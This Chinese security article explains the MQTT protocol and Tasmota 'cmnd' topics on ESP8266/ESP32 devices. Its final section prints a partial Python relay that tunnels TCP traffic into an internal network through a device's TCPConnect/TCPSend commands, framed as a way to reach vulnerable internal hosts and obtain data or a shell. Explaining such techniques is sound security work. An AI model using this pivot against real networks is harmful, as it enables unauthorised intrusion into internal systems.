> **原文链接**: https://mp.weixin.qq.com/s?__biz=MjM5MjEyMTcyMQ==&mid=2651037750&idx=1&sn=a6c5e9542227ab4295618093ed3d66a0

#  利用MQTT协议缺陷攻击内网物联设备  
NEURON  SAINTSEC   2025-06-13 10:46  
  
‍  
  
**#****0****1**  
  
  
**「 背景 」**  
  
  
MQTT  
是一种轻量级的通讯协议，特别适用于受限环境（如低带宽、不稳定的网络），其主要功能是提供了一种简单的、可靠的、实时的机制进行设备间的通信，而且通讯效率高、兼容各类常见的操作系统和硬件平台。  
MQTT  
可以采用  
TCP/IP  
协议、  
Websockets  
或  
UDP  
等协议来传输数据。  
  
  
**#****02****‍**  
  
  
**「 特点 」**  
  
  
轻量：由于其报文结构简单，因此运行在不同的开发环境中需要的资源更少。  
  
可靠：支持  
QoS  
保证消息的交付，在网络不稳定甚至失去连接的情况下仍然能够恢复之前未完成的消息传输。  
  
易于集成：只需一个客户端库便可快速地添加到现有项目中进行沟通交流，不会对系统架构造成重大改变。  
  
实时：通过发布  
/  
订阅机制使得设备之间能够实时传递消息。  
  
应用范围广泛：例如，物联网设备控制、传感器数据收集等场景都可以采用  
MQTT  
协议进行通信。  
  
  
**#****03****‍**  
  
  
**「 消息类型 」**  
  
  
MQTT  
协议定义了五种类型的消息：  
  
CONNECT  
  
表明客户端请求连接到服务端。  
  
CONNACK  
  
返回给客户端的连接确认信息。  
  
PUBLISH  
  
消息发布，用于将信息从发布者发送到一个或多个订阅者。  
  
SUBSCRIBE  
  
订阅消息，客户端通知网络中某些主题的一些感兴趣的内容，并收到有关这些主题的任何新消息。  
  
UNSUBSCRIBE  
  
取消订阅消息，用于取消之前订阅的指定频道的消息，取消之后，不会再收到该频道的任何消息。  
  
  
**#****04****‍**  
  
  
**「 内网攻击 」**  
  
  
**4.1****ESP8266/ESP32******  
  
ESP8266/ESP32  
是乐鑫公司推出的一系列针对物联网应用而开发的单芯片微控制器，具有以下特点：  
  
高性能和低成本：  
ESP8266/ESP32  
具有高性价比的特点，价格便宜但性能强大，支持通过互联网与其他设备进行通信。  
  
小巧轻量：  
ESP8266/ESP32  
芯片尺寸小且易于集成到各种设备中，适合需要紧凑设计的应用场景。  
  
低功耗：由于采用了节能技术，可深度睡眠模式的  
 ESP8266/ESP32   
芯片功耗很低，可以在长时间不充电的情况下工作。  
  
易于编程和多语言支持：  
ESP8266/ESP32  
芯片支持使用  
Arduino  
和  
Python  
等流行编程语言进行开发，因此与开发者常见的编程环境和开发工具完全兼容。  
  
WiFi  
和蓝牙功能：  
ESP8266/ESP32  
内置  
WiFi  
模块，可以轻松连接互联网并实现无线通信。同时还拥有蓝牙技术，支持  
BLE  
和  
classical Bluetooth  
两种方式。  
  
它们广泛应用于智能家居、智慧城市、智慧教育、智能制造、车联网、智慧农业等多个领域，其中包括：  
  
连接各种类型的传感器，如温度传感器、湿度传感器等，收集数据并与云端进行通信。  
  
加入现有的  
Wi-Fi  
网络以及通过蓝牙与其他设备通信。  
  
控制  
LED  
灯带、灯泡等各种类型的执行。  
  
  
**4.2****FullTopic******  
  
在  
MQTT  
协议中，一个完整的主题可以包含三个部分：  
 Topic  
前缀，  
Topic  
名称和  
Topic  
后缀。  
 FullTopic  
是指把这三个部分拼接在一起形成的完整主题。  
  
举个例子，假设有一个传感器设备，它要将温度数据发送到一个名为“  
room1  
”的主题下，并且希望该主题被其他订阅者所共享。这个  
FullTopic  
可以写成以下方式：  
  
devices/temperature/room1  
  
- devices  
是  
Topic  
前缀，用于标识消息来源或分类。  
  
- temperature  
是  
Topic  
名称，用于表示所发送的温度数据。  
  
- room1  
是  
Topic  
后缀，用于区分同一类型设备所产生的不同数据。  
  
总之，  
FullTopic  
非常重要，因为许多功能，例如发布  
/  
订阅，都要使用  
FullTopic  
。  
FullTopic  
不仅能够明确表示设备产生的数据，同时还具有层级结构，方便客户端组织和过滤数据。  
  
  
**4.3****特殊的FullTopic******  
  
在  
MQTT  
协议中，有一类特殊的  
FullTopic  
，其前缀为  
cmnd  
。这种  
FullTopic  
通常被用于指示  
MQTT  
客户端执行某个操作，比如开关灯、调整温度等。在  
ESP8266/ESP32  
等物联网设备中，  
cmnd  
前缀代表指令（  
command  
）的含义。例如，“  
cmnd/tasmota_XXXXXX/power on  
”就是让名为  
tasmota_XXXXXX  
的智能插座打开电源。  
  
FullTopic   
中的  
cmnd/+/TCPSend  
采用的是  
 MQTT   
协议，其中，  
  
- cmnd  
是主题（  
Topic  
）前缀，用来表示命令（  
command  
）的主题，通常是指向设备发送控制命令。  
  
- +  
是一个通配符，代表了一个单层的主题名，具体指什么需要看实际情况。可以匹配所有以  
 `cmnd/`   
开头的主题。  
  
- TCPSend  
是主题后缀，用来区分不同的控制命令。它通常会根据开发者或厂商自定义需求来具体设置。  
  
总的来说，这个  
 FullTopic   
表示发送给设备一个具体的  
TCP  
数据流的控制命令。  
   
例如：  
`cmnd/living-room/TCPSend`   
可以用来控制客厅中的设备使用某种  
TCP  
协议。  
  
除了  
cmnd  
外，  
MQTT  
协议还有其他的预定义前缀，每个前缀都有着不同的语义，例如  
stat  
表示状态（  
status  
），  
tele  
表示遥测（  
telemetry  
），  
cmnd  
则表示指令（  
commands  
）等。这些前缀可以帮助  
MQTT  
客户端更好地识别不同类型的消息，从而更加高效地处理和传递信息。  
  
  
**4.4****利用ESP8266/ESP32为跳板攻击内网**  
  
代码示例：  
  

```
sock.listen(1)
    # IP LISTENER
    while True:
        # Wait for a connection
        print ('[*] TCP: waiting for a connection')
        connection, client_address = sock.accept()
        try:
            print ('[>] TCP: connection from', client_address)
            print (f&#34;[>] MQTT2TCP: connecting to {REMOTE_IP}:{REMOTE_PORT}&#34;)
            # connecting through MQTT
            client.publish(f&#34;cmnd/{TASMOTA_NAME}/TCPConnect&#34;, f&#34;{REMOTE_IP}:{REMOTE_PORT}&#34;)
            client.tcpconn = connection
            # Receive the data in small chunks and retransmit it
            while True:
                    data = connection.recv(16)
                    print ('[>] TCP: received &#34;%s&#34;' % data)
                    if data:
                        print('[<] TCP: sending data back to the client')
                        client.publish(f&#34;cmnd/{TASMOTA_NAME}/TCPSend&#34;, binascii.hexlify((data)).upper())
                    else:
                        print ( '[*] TCP: no more data.')
                        client.publish(f&#34;cmnd/{TASMOTA_NAME}/TCPClose&#34;)
                        break

```

  
  
假如内网中存在一个脆弱易攻击的设备，若可以用  
mqtt  
协议访问到内网中的一个  
ESP8266/ESP32  
的设备，我们就可以利用其将  
mqtt  
协议转换成  
TCP  
流发送到脆弱的设备，从而拿到设备的敏感信息甚至直接拿到  
shell  
。  
  
